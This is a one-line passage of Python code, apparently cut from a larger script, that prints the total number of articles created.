    print(f"\nTotal: {len(articles)} articles created")
